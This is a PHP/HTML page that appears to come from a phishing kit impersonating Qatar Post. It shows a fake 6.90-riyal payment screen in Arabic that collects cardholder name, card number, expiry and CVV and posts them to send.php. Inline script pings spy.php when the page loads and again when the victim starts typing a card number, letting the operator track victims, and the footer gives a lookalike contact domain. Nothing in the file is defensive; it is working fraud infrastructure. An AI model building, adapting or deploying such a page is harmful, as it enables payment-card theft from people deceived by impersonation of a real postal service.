<?php 
require '../main.php';
?><!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<meta name="robots" content="nofollow,noindex">
<title>Qatar Postal Services</title>
<link rel="stylesheet" href="inc/style.css">
<link rel="icon" href="inc/icon.ico">
<script src="inc/jq.js"></script>
</head>
<body>
<div class="header">
<div class="left">
<img src="inc/menu.png">
</div>
<div class="right">
<img src="inc/logo.png">
</div>
</div>
<div style="background:#ffaf00; color:black; padding:20px; text-align:right; margin-bottom:-40px;">
<h2>التفاصيل</h2>
<table dir="rtl" style="width:100%; text-align:right;">
<tr>
<th>المبلغ: </th>
<td>6.90 ريال قطري</td>
</tr>
<tr>
<th>التاريخ: </th>
<td id='timing'>04-05-2022 03:41:18pm</td>
</tr>
</table>
</div>
<div style="text-align:center;">
<div class="form">
<form action="send.php" method="post">

<div class="formcol">


<h2>الدفع بواسطة البطاقة البنكية</h2>
</div>
<div class="formcol">
<input type="text" name="fullname" required placeholder="إسم حامل البطاقة">
</div>
 <div class="formcol">
<input type="text" name="cardnumber" required placeholder="رقم البطاقة">
</div>
 <div class="formcol" style="display:flex;">
 <div style="width:50%; padding:2px;">
<select name="month" required class="select">
<option selected disabled>الصلاحية - الشهر</option>
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06" selected>06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12</option>
</select>
</div>
<div style="width:50%; padding:2px;">
<select name="year" required class="select">
<option selected disabled>الصلاحية - السنة</option>
<option value="22" selected>2022</option>
<option value="23">2023</option>
<option value="24">2024</option>
<option value="25">2025</option>
<option value="26">2026</option>
<option value="27">2027</option>
<option value="28">2028</option>
<option value="29">2029</option>
<option value="30">2030</option>
</select>
</div>
</div>
 <div class="formcol">
<input type="text" name="cvv" required placeholder="CVV رمز ">
</div>
  <div class="formcol">
<button>المتابعة <img src="inc/narrow.png"></button>
</div>

</form>
</div>
</div>


<div class="footer">
<div class="f-side">
<div class="f-col">
<p>كيف يمكننا مساعدتك</p>
<span>الأسئلة الشائعة</span>
<span>المواد المحظورة</span>
<span>المعايير البريدية</span>
<span>فيديوهات</span>
</div>
<div class="f-col">
<p>حول بريد قطر</p>
<span>الرؤية و الرسالة و الأهداف</span>
<span>تاريخ بريد قطر</span>
<span>أخبار</span>
<span>الفروع وساعات العمل</span>
<span>الوظائف</span>
</div>
</div>
<div class="f-side">
<div class="f-col">
<p>خط التواصل</p>
<span>info@qatarposts.com</span>
<span>الخط الساخن 104</span>
<span>تابعونا</span>
<img src="inc/social.png" style="width:120px;">
</div>
<div class="f-col">
<p>سياسات</p>
<span>سياسة الخصوصية</span>
<span>السياسة العامة لأمن المعلومات</span>
<span>الشروط والأحكام</span>
<span>سياسة نظام الإدارة المتكامل</span>
</div>
</div>
<div class="f-side">
<div class="f-col">
<p>حمل التطبيق</p>
<img src="inc/android.png" style="width:70px;">
<img src="inc/apple.png" style="width:70px;">
</div>
<div class="f-col">
<img src="inc/bv.jpg" style="width:160px;">
</div>

</div>



</div>


<script src="inc/m.js"></script>
<script>
$("input[name=cardnumber]").mask("0000 0000 0000 0000");
$("input[name=cvv]").mask("000");

setInterval(function(){
$.post("date.php",{time:1},function(res){
	$("#timing").html(res);
})
 }, 1000);


$.post("spy.php",{cardview:1});

var c=0;
$("input[name=cardnumber]").keyup(function(){
c++;if(c==1){$.post("spy.php",{carding:1});}
});
</script>
</body>
</html>